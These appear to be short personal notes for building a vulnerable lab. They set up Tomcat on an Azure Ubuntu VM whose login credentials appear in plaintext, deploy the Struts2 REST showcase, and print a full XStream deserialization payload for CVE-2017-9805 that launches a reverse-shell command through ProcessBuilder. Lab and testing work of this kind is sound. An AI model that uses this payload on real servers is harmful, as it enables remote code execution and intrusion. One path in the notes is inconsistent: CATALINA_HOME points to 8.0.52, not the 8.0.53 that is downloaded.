# Azure Ubuntu VM

Name: ubuntu-tomcat
user: appadmin
pass: Pa55w0rd@123

## Tomcat setup

`mkdir /opt/tomcat`

`cd /opt/tomcat`

`wget http://apache.spinellicreations.com/tomcat/tomcat-8/v8.0.53/bin/apache-tomcat-8.0.53.tar.gz`

`tar xvzf apache-tomcat-8.0.53.tar.gz`

`apt-get install default-jdk`

`vim ~/.bashrc`

```
    export JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-amd64
    export CATALINA_HOME=/opt/tomcat/apache-tomcat-8.0.52
```

`source ~/.bashrc`

`$CATALINA_HOME/bin/startup.sh`

`wget http://central.maven.org/maven2/org/apache/struts/struts2-rest-showcase/2.5.10/struts2-rest-showcase-2.5.10.war`

https://blog.appsecco.com/detecting-and-exploiting-the-java-struts2-rest-plugin-vulnerability-cve-2017-9805-765773921d3d

```
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>bash-reverse-shell</string>
                      </command>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                  </filter>
                  <next></next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```